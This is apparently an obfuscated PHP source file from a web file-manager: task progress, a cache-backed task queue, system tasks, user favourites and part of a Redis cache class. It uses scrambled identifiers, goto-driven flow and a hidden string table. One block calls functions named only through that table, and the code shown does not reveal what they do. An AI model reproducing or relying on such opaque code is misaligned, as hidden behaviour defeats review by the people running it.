$B¼À²È´µ[$bË§¡¨Ç¾[1570]] = $B¼À²È´µ[$bË§¡¨Ç¾[1569]]; $B¼À²È´µ[$bË§¡¨Ç¾[1571]] = $bË§¡¨Ç¾[33]; if ($e˜î‘–Æ×Å == $B¼À²È´µ[$bË§¡¨Ç¾[1567]]) { $B¼À²È´µ[$bË§¡¨Ç¾[1573]] += $B¼À²È´µ[$bË§¡¨Ç¾[1569]]; $B¼À²È´µ[$bË§¡¨Ç¾[1574]] = $B¼À²È´µ[$bË§¡¨Ç¾[1573]]; $this->update(1); } else { $this->update(); $B¼À²È´µ[$bË§¡¨Ç¾[1570]] = 0; } self::log($bË§¡¨Ç¾[1582] . $Bá¢ŒîÂ£† . $bË§¡¨Ç¾[67] . $B…²›ô¬­Œ . $bË§¡¨Ç¾[228] . $e˜î‘–Æ×Å . $bË§¡¨Ç¾[1583] . $B¼À²È´µ[$bË§¡¨Ç¾[1567]]); } public function updateFileEnd($d†±ø‡ˆ¸å, $F¥‘…ëäÈİ) { goto FÁŞß¦Ó¯Û; C‡¢Ñ­¬õ: $E‡¢Ìá”Œ[$BÛôÑ¸î¯Î[1569]] = $F¥‘…ëäÈİ; $E‡¢Ìá”Œ[$BÛôÑ¸î¯Î[1573]] += $F¥‘…ëäÈİ; $E‡¢Ìá”Œ[$BÛôÑ¸î¯Î[1574]] = $E‡¢Ìá”Œ[$BÛôÑ¸î¯Î[1573]]; goto FîÇ¡ÖÎ½; FîÇ¡ÖÎ½: $this->update(1); self::log($BÛôÑ¸î¯Î[1584] . $d†±ø‡ˆ¸å); goto dÄñÊ¦Š¥É; FÁŞß¦Ó¯Û: $BÛôÑ¸î¯Î =& $_SERVER[Ç³Íß¦Ó]; $E‡¢Ìá”Œ =& $this->task; $E‡¢Ìá”Œ[$BÛôÑ¸î¯Î[1567]] = $d†±ø‡ˆ¸å; goto C‡¢Ñ­¬õ; dÄñÊ¦Š¥É: } public function sourceModelCopy($b‹‰¼ÄÍåæ) { goto DäàÅ¨ã®‚; DäàÅ¨ã®‚: $cŸ›İºáÚç =& $_SERVER[Ç³Íß¦Ó]; $aªĞÜÛ¤Ä­ = $b‹‰¼ÄÍåæ[0]; $DÄ¼¢Ë±‹ğ = $b‹‰¼ÄÍåæ[1]; goto Føª¼‹·ˆÃ; Føª¼‹·ˆÃ: $D¦­—‰”æó =& $this->task; $this->sourceModelCopyFlag = !0; $fî˜Ÿ‚¤› = 0; goto aà Š™÷‘; aà Š™÷‘: switch ($aªĞÜÛ¤Ä­) { case $cŸ›İºáÚç[534]: $fî˜Ÿ‚¤› = 1; break; case $cŸ›İºáÚç[537]: $D¦­—‰”æó[$cŸ›İºáÚç[1567]] = $DÄ¼¢Ë±‹ğ[$cŸ›İºáÚç[28]]; break; case $cŸ›İºáÚç[539]: $fî˜Ÿ‚¤› = intval($b‹‰¼ÄÍåæ[$cŸ›İºáÚç[376]] * 0.4); break; case $cŸ›İºáÚç[541]: $fî˜Ÿ‚¤› = intval($b‹‰¼ÄÍåæ[$cŸ›İºáÚç[376]] * 0.2); break; case $cŸ›İºáÚç[543]: $fî˜Ÿ‚¤› = intval($b‹‰¼ÄÍåæ[$cŸ›İºáÚç[376]] * 0.4); break; } $this->update($fî˜Ÿ‚¤›); $this->sourceModelCopyFlag = !1; goto F—¾­˜Áå; F—¾­˜Áå: } public function sourceRemove($aõÆøŞ‘˜ù, $AÇÉÉˆÚ‚¥) { $bÑŠ¹† =& $_SERVER[Ç³Íß¦Ó]; $this->sourceModelCopyFlag = !0; $f¡Úº‘õõí = 1; if (isset($aõÆøŞ‘˜ù[$bÑŠ¹†[81]])) { $f¡Úº‘õõí = $aõÆøŞ‘˜ù[$bÑŠ¹†[81]][$bÑŠ¹†[79]] + $aõÆøŞ‘˜ù[$bÑŠ¹†[81]][$bÑŠ¹†[80]] + 1; } $this->update($f¡Úº‘õõí); $this->sourceModelCopyFlag = !1; } public function sourceMove($Bß†¦õ¿»¹) { $this->sourceRemove($Bß†¦õ¿»¹, !1); } public function curlProgress($d¼È°ƒÌĞİ, $dğ°øÈé¼, $bÍ”ÍåÌ, $Aéùì‹‡™·, $Dİ¢¨šİÕ‰) { $FÎ•‚£Ôò =& $_SERVER[Ç³Íß¦Ó]; $b¹øŞ‹›· =& $this->task; if ($Dİ¢¨šİÕ‰ > 0) { $b¹øŞ‹›·[$FÎ•‚£Ôò[1023]] = $FÎ•‚£Ôò[1585]; $b¹øŞ‹›·[$FÎ•‚£Ôò[1571]] = $FÎ•‚£Ôò[107]; if ($b¹øŞ‹›·[$FÎ•‚£Ôò[1569]]) { $b¹øŞ‹›·[$FÎ•‚£Ôò[1570]] = $Dİ¢¨šİÕ‰; } if ($b¹øŞ‹›·[$FÎ•‚£Ôò[1572]]) { $b¹øŞ‹›·[$FÎ•‚£Ôò[1570]] = $Dİ¢¨šİÕ‰ + $b¹øŞ‹›·[$FÎ•‚£Ôò[1572]]; } } else { if ($bÍ”ÍåÌ > 0) { if ($b¹øŞ‹›·[$FÎ•‚£Ôò[1569]] == $dğ°øÈé¼) { $b¹øŞ‹›·[$FÎ•‚£Ôò[1570]] = $bÍ”ÍåÌ; $b¹øŞ‹›·[$FÎ•‚£Ôò[1023]] = $FÎ•‚£Ôò[1586]; $b¹øŞ‹›·[$FÎ•‚£Ôò[1571]] = $FÎ•‚£Ôò[1094]; } } } $this->update(); } public function curlProgressStart($bšÒ¥Äì”‰) { } public function curlProgressEnd($BÚÛšÆŞ‘ƒ) { goto F“¨¥®¦Æ; F“¨¥®¦Æ: $A‘ïÈ«ù‚„ =& $_SERVER[Ç³Íß¦Ó]; $EïÙ­àŠëï =& $this->task; $bƒĞİŸŞÀ = curl_getinfo($BÚÛšÆŞ‘ƒ); goto eÄ¶£äË…î; eÄ¶£äË…î: $cÊ”¦Ú˜ÏÇ = $bƒĞİŸŞÀ[$A‘ïÈ«ù‚„[1587]]; if ($cÊ”¦Ú˜ÏÇ == -1) { $cÊ”¦Ú˜ÏÇ = $bƒĞİŸŞÀ[$A‘ïÈ«ù‚„[1588]]; } if ($EïÙ­àŠëï[$A‘ïÈ«ù‚„[1571]] == $A‘ïÈ«ù‚„[107] && $cÊ”¦Ú˜ÏÇ) { $EïÙ­àŠëï[$A‘ïÈ«ù‚„[1572]] += $cÊ”¦Ú˜ÏÇ; } goto bŞ‹Ú¼Ô‹; bŞ‹Ú¼Ô‹: $this->update(); goto fÑßˆšÀñæ; fÑßˆšÀñæ: } } class TaskHttp extends Task { protected function startAfter() { $f×™ñ‡Ôå‹ =& $_SERVER[Ç³Íß¦Ó]; $dˆŞç¬¸è‹ =& $this->task; $dˆŞç¬¸è‹[$f×™ñ‡Ôå‹[1589]] = 1; Hook::bind($f×™ñ‡Ôå‹[1561], array($this, $f×™ñ‡Ôå‹[1590])); Hook::bind($f×™ñ‡Ôå‹[1563], array($this, $f×™ñ‡Ôå‹[1591])); Hook::bind($f×™ñ‡Ôå‹[1565], array($this, $f×™ñ‡Ôå‹[1592])); } protected function endAfter() { $bÕÛ¥ŒèŠæ =& $_SERVER[Ç³Íß¦Ó]; Hook::unbind($bÕÛ¥ŒèŠæ[1561], array($this, $bÕÛ¥ŒèŠæ[1590])); Hook::unbind($bÕÛ¥ŒèŠæ[1563], array($this, $bÕÛ¥ŒèŠæ[1591])); Hook::unbind($bÕÛ¥ŒèŠæ[1565], array($this, $bÕÛ¥ŒèŠæ[1592])); } public function progressStart($d…—¥ƒë·í) { $EĞ¼ÏÀ›À =& $_SERVER[Ç³Íß¦Ó]; $B…Ñ³ƒÚãØ = curl_getinfo($d…—¥ƒë·í); self::log($EĞ¼ÏÀ›À[1593] . $B…Ñ³ƒÚãØ[$EĞ¼ÏÀ›À[304]]); self::valueSet($this->task[$EĞ¼ÏÀ›À[392]], $this->task); } public function progressEnd($D—´´ãÁ²ø) { $dãÒÂ¸À‹´ =& $_SERVER[Ç³Íß¦Ó]; self::log($dãÒÂ¸À‹´[1594] . $this->task[$dãÒÂ¸À‹´[392]]); $this->end(); } public function progress($A…™‚Ê¨ØÂ, $FÁ††ØÎµë, $e™Ü¨´”Ôõ, $CÛè¶‘İÊé, $eÄ½øéÈ†) { $a»ì’—Ÿò =& $_SERVER[Ç³Íß¦Ó]; $CÓèâÒ­±ƒ =& $this->task; if ($eÄ½øéÈ† > 0) { $CÓèâÒ­±ƒ[$a»ì’—Ÿò[1021]] = $CÓèâÒ­±ƒ[$a»ì’—Ÿò[1021]] == 0 ? $CÛè¶‘İÊé : $CÓèâÒ­±ƒ[$a»ì’—Ÿò[1021]]; $CÓèâÒ­±ƒ[$a»ì’—Ÿò[1036]] = $eÄ½øéÈ†; } else { if ($e™Ü¨´”Ôõ > 0) { $CÓèâÒ­±ƒ[$a»ì’—Ÿò[1021]] = $CÓèâÒ­±ƒ[$a»ì’—Ÿò[1021]] == 0 ? $FÁ††ØÎµë : $CÓèâÒ­±ƒ[$a»ì’—Ÿò[1021]]; $CÓèâÒ­±ƒ[$a»ì’—Ÿò[1036]] = $e™Ü¨´”Ôõ; } } $this->update(); self::log("\x70\x72\157\x67\x72\145\x73\x73\x48\164\x74\160\72\144\157\x77\156\x3a{$e™Ü¨´”Ôõ}\x2f{$FÁ††ØÎµë}\73\x20\x75\x70\x6c\157\x61\x64\x3a{$eÄ½øéÈ†}\57{$CÛè¶‘İÊé}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\163\x6b\121\165\x65\165\145\x4c\x65\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\163\x6b\121\x75\x65\x75\x65\104\x61\x74\141"; public static $listData = false; public static function initTask() { } public static function add($a¹Ü˜Õ·µ„, $e´¼‡âµ”Ï = array(), $FÜ¨¢Ú„Ë‡ = '', $C©¤…ã×ë = '') { $A•ÂĞ‘ß‚î =& $_SERVER[Ç³Íß¦Ó]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($C©¤…ã×ë && array_find_by_field(self::$listData, $A•ÂĞ‘ß‚î[93], $C©¤…ã×ë)) { return !0; } self::$listData[] = array($A•ÂĞ‘ß‚î[261] => $a¹Ü˜Õ·µ„, $A•ÂĞ‘ß‚î[1595] => $e´¼‡âµ”Ï, $A•ÂĞ‘ß‚î[429] => $FÜ¨¢Ú„Ë‡, $A•ÂĞ‘ß‚î[93] => $C©¤…ã×ë); return !0; } public static function addSubmit() { $B°£½Óöç„ =& $_SERVER[Ç³Íß¦Ó]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($B°£½Óöç„[1596] . json_encode_force(array_to_keyvalue(self::$listData, $B°£½Óöç„[33], $B°£½Óöç„[429])), $B°£½Óöç„[1597]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($eÙæÒ©í’, $céÕ¸›ò¼ = array(), $d÷Œ«òµï¾ = '', $fÆëÔ±–ƒÇ = '') { goto b°È× ÃÁã; FµïòÜ§‰ˆ: if ($fÆëÔ±–ƒÇ && array_find_by_field($Cöâ“µ¤‹”, $aÆ‹—Ç±´‹[93], $fÆëÔ±–ƒÇ)) { return !0; } $Cöâ“µ¤‹”[] = array($aÆ‹—Ç±´‹[261] => $eÙæÒ©í’, $aÆ‹—Ç±´‹[1595] => $céÕ¸›ò¼, $aÆ‹—Ç±´‹[429] => $d÷Œ«òµï¾, $aÆ‹—Ç±´‹[93] => $fÆëÔ±–ƒÇ); write_log($aÆ‹—Ç±´‹[1596] . $d÷Œ«òµï¾, $aÆ‹—Ç±´‹[1597]); goto cøòã»•óğ; b°È× ÃÁã: $aÆ‹—Ç±´‹ =& $_SERVER[Ç³Íß¦Ó]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Cöâ“µ¤‹” = self::getAll(); goto FµïòÜ§‰ˆ; cøòã»•óğ: self::setAll($Cöâ“µ¤‹”); return !0; goto FÄäœçï; FÄäœçï: } public static function run() { goto cà÷¾Ê­Í; F¸„È§ÍìÉ: if (!$E”ŒÏ•çÕù) { return !1; } self::setAll($E„±‰ë”ä“); $DÏÁÍ¸‚øˆ = timeFloat(); goto D»—¡ÉÉÑ; cà÷¾Ê­Í: $cí¥¯ÌĞØÄ =& $_SERVER[Ç³Íß¦Ó]; $E„±‰ë”ä“ = self::getAll(); $E”ŒÏ•çÕù = array_shift($E„±‰ë”ä“); goto F¸„È§ÍìÉ; dÁ¥´ö›: return !0; goto bÈÑÈ’¡Óš; D»—¡ÉÉÑ: try { Hook::apply($E”ŒÏ•çÕù[$cí¥¯ÌĞØÄ[261]], $E”ŒÏ•çÕù[$cí¥¯ÌĞØÄ[1595]]); } catch (Exception $AÇÆÂãà¸) { } $Fˆø‚¬Ø’ß = number_format(timeFloat() - $DÏÁÍ¸‚øˆ, 3) . $cí¥¯ÌĞØÄ[1539]; write_log($cí¥¯ÌĞØÄ[1598] . $E”ŒÏ•çÕù[$cí¥¯ÌĞØÄ[429]] . $cí¥¯ÌĞØÄ[1599] . $Fˆø‚¬Ø’ß, $cí¥¯ÌĞØÄ[1597]); goto dÁ¥´ö›; bÈÑÈ’¡Óš: } public static function count() { $E½èÆ˜ÊÜ‰ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$E½èÆ˜ÊÜ‰) { return 0; } return intval($E½èÆ˜ÊÜ‰); } public static function getAll() { $C™Êâ´›»ã = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$C™Êâ´›»ã) { return array(); } return $C™Êâ´›»ã; } public static function setAll($e‘ñŠß†µÅ) { $cìÍ‡°ÊËä = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($e‘ñŠß†µÅ), $cìÍ‡°ÊËä); Cache::set(self::QUEUE_DATA, $e‘ñŠß†µÅ, $cìÍ‡°ÊËä); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto E²ªÈ‡™Ä£; e˜ğÕÖè§: if ($_SERVER[$_SERVER[Ç³Íß¦Ó][834]] != $_SERVER[$_SERVER[Ç³Íß¦Ó][1392]]) { goto aÌ¦šÛ‚‰é; FƒòÆŒ•ä: $f“äç‚İ‡î($_SERVER[$_SERVER[Ç³Íß¦Ó][832]]); goto Dé¼‹ØÈò; aÌ¦šÛ‚‰é: $Eõäâ˜ÓÃ = $_SERVER[Ç³Íß¦Ó][836]; $A«¤õƒ¯ = $_SERVER[$_SERVER[Ç³Íß¦Ó][837]] . $_SERVER[Ç³Íß¦Ó][838]; $B†«é™‰Á© = $Eõäâ˜ÓÃ($A«¤õƒ¯); goto Bêò“¶æ´Ë; Bêò“¶æ´Ë: $aà¤¶¨¿È = explode($_SERVER[Ç³Íß¦Ó][228], $B†«é™‰Á©); if (count($aà¤¶¨¿È) < $_SERVER[Ç³Íß¦Ó][598]) { $Aì»Ó¯¿Œİ = $_SERVER[Ç³Íß¦Ó][839]; $Aì»Ó¯¿Œİ(); } $f“äç‚İ‡î = $_SERVER[Ç³Íß¦Ó][1393]; goto FƒòÆŒ•ä; Dé¼‹ØÈò: } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x74\x61\163\x6b\114\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\164\x79\x70\x65", "\x65\166\145\156\x74", "\164\151\155\x65", "\144\x65\x73\143", "\163\171\163\x74\x65\155", "\145\156\x61\142\154\145", "\154\141\x73\x74\x52\x75\x6e", "\163\x6f\162\x74"); public function listData($C˜É¬á = false, $d°õ¯”½ = "\163\x6f\162\x74", $EÌ†øğ–Œ˜ = false) { return parent::listData($C˜É¬á, $d°õ¯”½, $EÌ†øğ–Œ˜); } public function add($C•ª‹³ñó¸) { $EøÜˆèáÅö =& $_SERVER[Ç³Íß¦Ó]; $DÖ¼ÍƒÜ…Õ = $this->findByName($C•ª‹³ñó¸[$EøÜˆèáÅö[28]]); if ($DÖ¼ÍƒÜ…Õ) { return !1; } $C•ª‹³ñó¸[$EøÜˆèáÅö[1491]] = 0; $C•ª‹³ñó¸[$EøÜˆèáÅö[1712]] = $this->getSort(); return parent::insert($C•ª‹³ñó¸); } private function getSort() { $DÂŒ³°óÏ =& $_SERVER[Ç³Íß¦Ó]; $E´¥ô«İª = parent::listData(); $f”˜®ÄÚÒ¨ = array_to_keyvalue($E´¥ô«İª, $DÂŒ³°óÏ[33], $DÂŒ³°óÏ[1712]); return empty($f”˜®ÄÚÒ¨) ? 0 : max($f”˜®ÄÚÒ¨) + 1; } public function update($DšÃÎ¬ÊŠ¦, $CÀä²çÏİç) { $d˜Û®›‘åâ =& $_SERVER[Ç³Íß¦Ó]; $aÓÔ–„Ÿêì = $this->listData($DšÃÎ¬ÊŠ¦); $d°ï¸ê£ = $this->findByName($CÀä²çÏİç[$d˜Û®›‘åâ[28]]); if (!$aÓÔ–„Ÿêì || $d°ï¸ê£ && $d°ï¸ê£[$d˜Û®›‘åâ[392]] != $aÓÔ–„Ÿêì[$d˜Û®›‘åâ[392]]) { return !1; } return parent::update($DšÃÎ¬ÊŠ¦, $CÀä²çÏİç); } public function remove($e…†Æƒ‚äš, $c¸Œ¸Ù×‹ì = false) { $bêŒ²¨¾²± =& $_SERVER[Ç³Íß¦Ó]; $d£¡¨ª—§¸ = $this->listData($e…†Æƒ‚äš); if (!$d£¡¨ª—§¸) { return; } if (!$c¸Œ¸Ù×‹ì && $d£¡¨ª—§¸[$bêŒ²¨¾²±[1169]] == $bêŒ²¨¾²±[87]) { return !1; } return parent::remove($e…†Æƒ‚äš); } public function enable($aµ´—©÷, $C«ÆªîŸ—) { return $this->update($aµ´—©÷, array($_SERVER[Ç³Íß¦Ó][2097] => $C«ÆªîŸ—)); } public function run($B¹ãÃÇ¢ß) { return $this->update($B¹ãÃÇ¢ß, array($_SERVER[Ç³Íß¦Ó][2107] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($dê­ë‚òÒ) { $EÅ²ƒÚŠİ¦ =& $_SERVER[Ç³Íß¦Ó]; return array($EÅ²ƒÚŠİ¦[1791] => array(USER_ID, $EÅ²ƒÚŠİ¦[2108])); } protected function listData() { $F·¯ô¯ôÕ… =& $_SERVER[Ç³Íß¦Ó]; $Có°È‡Ê†’ = array($F·¯ô¯ôÕ…[1518] => USER_ID, $F·¯ô¯ôÕ…[461] => 0); $E­©ÈåÚ­ç = $F·¯ô¯ôÕ…[2109]; $AéŸà“è‹¯ = $this->field($E­©ÈåÚ­ç)->where($Có°È‡Ê†’)->order($F·¯ô¯ôÕ…[2110])->select(); return $AéŸà“è‹¯ ? $AéŸà“è‹¯ : array(); } protected function resetCache() { } protected function listView() { goto D£ìĞÂÕ; dÑÚÙÜö™‚: $fÓˆğ’›²„ = array_to_keyvalue($D‘……ÌŞ‡¤, $båØ—‰ˆŸ…[33], $båØ—‰ˆŸ…[76]); if (!$fÓˆğ’›²„) { return $fÜ¾¥Š¤Æ«; } $bô…Ù’¦µ¤ = 2000; goto fŒĞêÊœõª; D£ìĞÂÕ: $båØ—‰ˆŸ… =& $_SERVER[Ç³Íß¦Ó]; $fÜ¾¥Š¤Æ« = $this->listData(); $D‘……ÌŞ‡¤ = array_filter_by_field($fÜ¾¥Š¤Æ«, $båØ—‰ˆŸ…[29], $båØ—‰ˆŸ…[407]); goto dÑÚÙÜö™‚; fŒĞêÊœõª: $BŸÜî¿ãµÄ = array($båØ—‰ˆŸ…[408] => array($båØ—‰ˆŸ…[409], $fÓˆğ’›²„)); $a„÷Ì‘ÍÛË = Model($båØ—‰ˆŸ…[791])->listSource($BŸÜî¿ãµÄ, $bô…Ù’¦µ¤); $a„÷Ì‘ÍÛË = array_merge($a„÷Ì‘ÍÛË[$båØ—‰ˆŸ…[74]], $a„÷Ì‘ÍÛË[$båØ—‰ˆŸ…[75]]); goto Aˆ†ÎöĞ£™; Aˆ†ÎöĞ£™: $a„÷Ì‘ÍÛË = array_to_keyvalue($a„÷Ì‘ÍÛË, $båØ—‰ˆŸ…[394]); foreach ($fÜ¾¥Š¤Æ« as $b›…·Õ’ˆ£ => $A†¦Ÿá‚Å±) { $BÛñÃ›ß” = $a„÷Ì‘ÍÛË[$A†¦Ÿá‚Å±[$båØ—‰ˆŸ…[76]]]; $BÛñÃ›ß” = $BÛñÃ›ß” ? $BÛñÃ›ß” : array(); $fÜ¾¥Š¤Æ«[$b›…·Õ’ˆ£] = array_merge($BÛñÃ›ß”, $A†¦Ÿá‚Å±); } return $fÜ¾¥Š¤Æ«; goto Aõä’—‚òÆ; Aõä’—‚òÆ: } protected function addFav($a”Âø¡¯ÚÒ, $d¤çÖƒÂ®Œ = '', $Fòê¨´¢ºò = "\x73\157\165\162\143\x65") { goto f–ï°´â¨±; d¼‹š‡Ø’: $fÖ«šƒ™„‹ = array($DŒ’ä•Áœ”[1518] => USER_ID, $DŒ’ä•Áœ”[461] => 0); $eªæäàôÊ¼ = $this->where($fÖ«šƒ™„‹)->max($DŒ’ä•Áœ”[1712]); if (!$eªæäàôÊ¼) { $eªæäàôÊ¼ = 0; } goto eŞîÛŸÏ; eŞîÛŸÏ: if (!$d¤çÖƒÂ®Œ && $Fòê¨´¢ºò == $DŒ’ä•Áœ”[407]) { $føÅ–‡œ‹œ = Model($DŒ’ä•Áœ”[1204])->where(array($DŒ’ä•Áœ”[408] => $a”Âø¡¯ÚÒ))->find(); if (!$føÅ–‡œ‹œ) { return !1; } $d¤çÖƒÂ®Œ = $føÅ–‡œ‹œ[$DŒ’ä•Áœ”[28]]; } $d¤çÖƒÂ®Œ = $this->getAutoName($d¤çÖƒÂ®Œ); $fî«¸¸Óğµ = array($DŒ’ä•Áœ”[1518] => USER_ID, $DŒ’ä•Áœ”[461] => 0, $DŒ’ä•Áœ”[411] => $d¤çÖƒÂ®Œ, $DŒ’ä•Áœ”[412] => $a”Âø¡¯ÚÒ, $DŒ’ä•Áœ”[413] => $Fòê¨´¢ºò, $DŒ’ä•Áœ”[1693] => $eªæäàôÊ¼ + 1); goto C§İˆ£ó”; f–ï°´â¨±: $DŒ’ä•Áœ” =& $_SERVER[Ç³Íß¦Ó]; $fÖ«šƒ™„‹ = array($DŒ’ä•Áœ”[1518] => USER_ID, $DŒ’ä•Áœ”[461] => 0, $DŒ’ä•Áœ”[413] => $Fòê¨´¢ºò, $DŒ’ä•Áœ”[412] => $a”Âø¡¯ÚÒ); if ($this->where($fÖ«šƒ™„‹)->find()) { return !1; } goto d¼‹š‡Ø’; C§İˆ£ó”: return $this->add($fî«¸¸Óğµ); goto e¿‚´¬â¯§; e¿‚´¬â¯§: } protected function remove($aÉ»Ï•—¦) { $a°½¹ªÂ =& $_SERVER[Ç³Íß¦Ó]; $AÚÀâß—†É = array($a°½¹ªÂ[1518] => USER_ID, $a°½¹ªÂ[410] => $aÉ»Ï•—¦); return $this->where($AÚÀâß—†É)->delete(); } protected function removeByName($eøÖ…§¿Ë) { $AĞ™Ş¨Äáù =& $_SERVER[Ç³Íß¦Ó]; $D‘¤¯©¹Ëµ = array($AĞ™Ş¨Äáù[1518] => USER_ID, $AĞ™Ş¨Äáù[411] => $eøÖ…§¿Ë, $AĞ™Ş¨Äáù[461] => 0); return $this->where($D‘¤¯©¹Ëµ)->delete(); } protected function rename($Eé£ÑÌˆË÷, $C³ôŸ›Û´™) { $cÃÁàÖ«Àä =& $_SERVER[Ç³Íß¦Ó]; if ($Eé£ÑÌˆË÷ == $C³ôŸ›Û´™) { return !1; } $cŞÜƒôöš· = $this->getAutoName($C³ôŸ›Û´™); if ($C³ôŸ›Û´™ != $cŞÜƒôöš·) { return !1; } $f©ùƒƒÊ•ò = array($cÃÁàÖ«Àä[1518] => USER_ID, $cÃÁàÖ«Àä[461] => 0, $cÃÁàÖ«Àä[28] => $Eé£ÑÌˆË÷); return $this->where($f©ùƒƒÊ•ò)->save(array($cÃÁàÖ«Àä[28] => $C³ôŸ›Û´™)); } protected function resetSort($f¿»õÎĞõÓ) { $AÌæçÓÏ¹ã =& $_SERVER[Ç³Íß¦Ó]; $f¿»õÎĞõÓ = is_array($f¿»õÎĞõÓ) ? $f¿»õÎĞõÓ : array(); $aù¹ÀƒÛÃ = array($AÌæçÓÏ¹ã[1518] => USER_ID); for ($b¦¬ö„Ñ„« = 0; $b¦¬ö„Ñ„« < count($f¿»õÎĞõÓ); $b¦¬ö„Ñ„«++) { $aù¹ÀƒÛÃ[$AÌæçÓÏ¹ã[410]] = $f¿»õÎĞõÓ[$b¦¬ö„Ñ„«]; $this->where($aù¹ÀƒÛÃ)->save(array($AÌæçÓÏ¹ã[1693] => $b¦¬ö„Ñ„« + 1)); } return !0; } protected function moveTop($AáÉîï¢à) { goto bÔİ—ö›É™; dçÙíÄÌ·„: $e‚ğÁË—›Á = $DÜ¿‰Ë·®Ü; $DÜ¿‰Ë·®Ü = array_remove_value($DÜ¿‰Ë·®Ü, $c¯Í®¡ãéÈ[$c¸î˜¨Ïª™[392]]); array_unshift($DÜ¿‰Ë·®Ü, $c¯Í®¡ãéÈ[$c¸î˜¨Ïª™[392]]); goto C¤¹±µ¡í›; Bº¹õ­õí: if (!$c¯Í®¡ãéÈ) { return; } $DÜ¿‰Ë·®Ü = $this->field($c¸î˜¨Ïª™[392])->where($d±ç¶¾‰éá)->order($c¸î˜¨Ïª™[2110])->select(); $DÜ¿‰Ë·®Ü = array_to_keyvalue($DÜ¿‰Ë·®Ü, $c¸î˜¨Ïª™[33], $c¸î˜¨Ïª™[392]); goto dçÙíÄÌ·„; C¤¹±µ¡í›: return $this->resetSort($DÜ¿‰Ë·®Ü); goto bíîèƒ³‡õ; bÔİ—ö›É™: $c¸î˜¨Ïª™ =& $_SERVER[Ç³Íß¦Ó]; $d±ç¶¾‰éá = array($c¸î˜¨Ïª™[1518] => USER_ID, $c¸î˜¨Ïª™[461] => 0); $c¯Í®¡ãéÈ = $this->where($d±ç¶¾‰éá)->where(array($c¸î˜¨Ïª™[28] => $AáÉîï¢à))->find(); goto Bº¹õ­õí; bíîèƒ³‡õ: } protected function moveBottom($Cå„†Ê˜µ) { $C¡µ©Ø‚î… =& $_SERVER[Ç³Íß¦Ó]; $BÓ¡Õ„© = array($C¡µ©Ø‚î…[1518] => USER_ID, $C¡µ©Ø‚î…[461] => 0); $dÉÉ‹“–…Ã = $this->where($BÓ¡Õ„©)->max($C¡µ©Ø‚î…[1712]); $eª‘É§Á¤· = array($C¡µ©Ø‚î…[1712] => $dÉÉ‹“–…Ã + 1); return $this->where($BÓ¡Õ„©)->where(array($C¡µ©Ø‚î…[28] => $Cå„†Ê˜µ))->save($eª‘É§Á¤·); } private function getAutoName($F¬˜Ç…–‡å) { goto F”—Ñßäğ; a•èÂè…ÈÂ: return $F¬˜Ç…–‡å . "\x28{$dÙŒ¸Èµ¯õ}\x29"; goto E©º·²ƒèË; F”—Ñßäğ: $còô†‘äÛô =& $_SERVER[Ç³Íß¦Ó]; $E©–ôÕÀòç = array($còô†‘äÛô[1518] => USER_ID, $còô†‘äÛô[461] => 0); $a¸ˆÍ’“Ø = $this->field($còô†‘äÛô[28])->where($E©–ôÕÀòç)->select(); goto e¯¸ÅÖ‡©œ; e¯¸ÅÖ‡©œ: $a¸ˆÍ’“Ø = array_to_keyvalue($a¸ˆÍ’“Ø, $còô†‘äÛô[33], $còô†‘äÛô[28]); if (!$a¸ˆÍ’“Ø || !in_array($F¬˜Ç…–‡å, $a¸ˆÍ’“Ø)) { return $F¬˜Ç…–‡å; } for ($dÙŒ¸Èµ¯õ = 0; $dÙŒ¸Èµ¯õ < count($a¸ˆÍ’“Ø); $dÙŒ¸Èµ¯õ++) { if (!in_array($F¬˜Ç…–‡å . "\50{$dÙŒ¸Èµ¯õ}\51", $a¸ˆÍ’“Ø)) { return $F¬˜Ç…–‡å . "\x28{$dÙŒ¸Èµ¯õ}\51"; } } goto a•èÂè…ÈÂ; E©º·²ƒèË: } } goto A½ô§Ÿ¥®; EÕæ‘°ÑÍÌ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($eÀÛ´‹é, $eËº¹†¨Ì§) { $BÛÒÙ§“‰ƒ =& $_SERVER[Ç³Íß¦Ó]; if (!class_exists($BÛÒÙ§“‰ƒ[825])) { show_json($BÛÒÙ§“‰ƒ[826], !1); } $this->cacheTime = $eËº¹†¨Ì§; $B•¶¹Õªèó = isset($eÀÛ´‹é[$BÛÒÙ§“‰ƒ[827]]) ? $eÀÛ´‹é[$BÛÒÙ§“‰ƒ[827]] : 10; $dèğ£Êï™Ü = _get($eÀÛ´‹é, $BÛÒÙ§“‰ƒ[824]); if ($dèğ£Êï™Ü && is_array($dèğ£Êï™Ü)) { $this->initCluster($eÀÛ´‹é, $B•¶¹Õªèó); } else { $this->handle = $this->init($eÀÛ´‹é, $B•¶¹Õªèó); } } private function init($B¤¹‚ÏŒˆ, $CåÈùäø‰ç) { $c–£Ó¬ÙÕñ =& $_SERVER[Ç³Íß¦Ó]; $dÇƒÆºµ„Ê = new Redis(); $Bõ½³ñÜ« = isset($B¤¹‚ÏŒˆ[$c–£Ó¬ÙÕñ[828]]) ? $B¤¹‚ÏŒˆ[$c–£Ó¬ÙÕñ[828]] : !1; if ($Bõ½³ñÜ«) { $dÇƒÆºµ„Ê->pconnect($B¤¹‚ÏŒˆ[$c–£Ó¬ÙÕñ[175]], $B¤¹‚ÏŒˆ[$c–£Ó¬ÙÕñ[176]], $CåÈùäø‰ç); } else { $dÇƒÆºµ„Ê->connect($B¤¹‚ÏŒˆ[$c–£Ó¬ÙÕñ[175]], 